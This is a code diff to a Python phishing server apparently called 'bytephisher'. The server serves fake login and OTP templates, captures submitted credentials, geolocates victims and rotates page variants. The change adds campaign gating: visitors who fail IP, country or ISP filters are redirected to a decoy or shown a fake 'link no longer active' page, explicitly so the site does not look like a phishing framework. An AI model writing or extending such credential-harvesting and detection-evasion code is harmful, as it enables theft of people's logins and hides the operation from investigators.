@@ -73,7 +73,16 @@ def _is_creds(d: dict) -> bool:
     return ident and secret
 
 def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", otp=False,
-                 on_capture=None, site_name=None, campaign=None, rotate_dirs=None):
+                 on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
+                 gate=None, decoy_url=""):
+    # A class body cannot see the enclosing function's locals for a name it is
+    # itself assigning (`gate = gate` raises NameError), so bind through
+    # differently-named locals.
+    _gate_obj = gate
+    _decoy_url = decoy_url
+    _rotation = list(rotate_dirs or [])
+    _notifier = on_capture
+
     class PhishHandler(http.server.BaseHTTPRequestHandler):
         db = cap.CaptureDB(db_path)
         redirect = redirect_url
@@ -81,10 +90,14 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
         # staticmethod: a plain function stored on the class would bind `self`
         # as its first argument and the callback would receive the handler
         # instead of the capture dict.
-        notifier = staticmethod(on_capture) if on_capture else None
+        notifier = staticmethod(_notifier) if _notifier else None
         template_name = site_name
         campaign_name = campaign or site_name or ""
-        rotation = list(rotate_dirs or [])   # A/B: one of these per request
+        rotation = _rotation                   # A/B: one of these per request
+        gate = _gate_obj                       # campaign gating (optional)
+        decoy = _decoy_url
+        geo_cache = {}                         # ip -> (ts, geo), for gating lookups
+        geo_cache_ttl = 600
 
         def log_message(self, fmt, *args):
             pass  # silence default stderr logging; structured logs go to DB
@@ -107,6 +120,48 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
             "ipinfo": "https://ipinfo.io/{ip}/json",
         }
 
+        def _geo_cached(self, ip):
+            """Geo with a per-process TTL cache — gating must not call the geo
+            API on every single request."""
+            now = time.time()
+            hit = self.geo_cache.get(ip)
+            if hit and now - hit[0] < self.geo_cache_ttl:
+                return hit[1]
+            geo = self._geo(ip)
+            self.geo_cache[ip] = (now, geo)
+            return geo
+
+        def _gated_out(self, ip, geo=None):
+            """True when the campaign gate refuses this visitor.
+            The refusal is logged (with reason) and the visitor gets the decoy."""
+            if not (self.gate and self.gate.enabled):
+                return False
+            geo = geo or (self._geo_cached(ip) if self.gate.needs_geo
+                          else {"country": "", "isp": ""})
+            allowed, reason = self.gate.check(ip=ip, country=geo.get("country"),
+                                             isp=geo.get("isp"))
+            if allowed:
+                return False
+            try:
+                self.db.log_blocked(ip, geo.get("country", ""), reason)
+            except Exception:
+                pass
+            if self.decoy:
+                self.send_response(302)
+                self.send_header("Location", self.decoy)
+                self.end_headers()
+            else:
+                # inert page: looks like a dead link, not a phishing framework
+                body = (b"<!doctype html><html><head><title>503</title></head>"
+                        b"<body><h1>Service unavailable</h1>"
+                        b"<p>This link is no longer active.</p></body></html>")
+                self.send_response(503)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+            return True
+
         def _geo(self, ip):
             if geo_provider == "off" or not ip:
                 return {"ip": ip, "city": "", "country": "", "isp": ""}
@@ -114,12 +169,8 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
             if not tmpl:
                 return {"ip": ip, "city": "", "country": "", "isp": ""}
             try:
-                import urllib.request
-                req = urllib.request.Request(
-                    tmpl.format(ip=ip),
-                    headers={"User-Agent": "bytephisher/1.0", "Accept": "application/json"})
-                with urllib.request.urlopen(req, timeout=5) as r:
-                    g = json.loads(r.read().decode("utf-8", "replace"))
+                from . import net
+                g = net.fetch_json(tmpl.format(ip=ip), timeout=5)
                 return {
                     "ip": ip,
                     "city": g.get("city") or "",
@@ -162,11 +213,18 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
                 self.end_headers()
                 self.wfile.write(GIF_1PX)
                 return
-            # page view -> visitor counter (creds come in via POST)
+            # page view -> visitor counter (creds come in via POST).
+            # The campaign gate runs first: a refused visitor is logged as
+            # blocked and never counted as a served visitor.
+            ip = self._client_ip()
+            if self._gated_out(ip):
+                return
             try:
-                self.db.log_visit(self._client_ip(), self.headers.get("User-Agent", ""))
+                self.db.log_visit(ip, self.headers.get("User-Agent", ""))
             except Exception:
                 pass
+            if self.gate and self.gate.enabled:
+                self.gate.note_hit(ip)
             # render template — OTP page only when explicitly requested (/otp),
             # otherwise the victim always sees the login page first.
             # With --rotate, one of the rotation templates is chosen per request.
@@ -190,6 +248,8 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
             ct = (self.headers.get("Content-Type") or "").lower()
             fields = _extract_fields(raw, ct)
             ip = self._client_ip()
+            if self._gated_out(ip):
+                return
             geo = self._geo(ip)
             ua = self.headers.get("User-Agent", "")
             dev = self._device(ua)
@@ -241,11 +301,12 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
 
 def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi",
             redirect_url="", otp=False, tls=False, cert_path=None,
-            on_capture=None, site_name=None, campaign=None, rotate_dirs=None):
+            on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
+            gate=None, decoy_url=""):
     """Start the server; returns (httpd, handler_class)."""
     Handler = make_handler(templates_dir, db_path, geo_provider, redirect_url, otp,
                            on_capture=on_capture, site_name=site_name, campaign=campaign,
-                           rotate_dirs=rotate_dirs)
+                           rotate_dirs=rotate_dirs, gate=gate, decoy_url=decoy_url)
     class _ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
         daemon_threads = True
         # HTTPServer's default backlog is 5; a burst of simultaneous victims
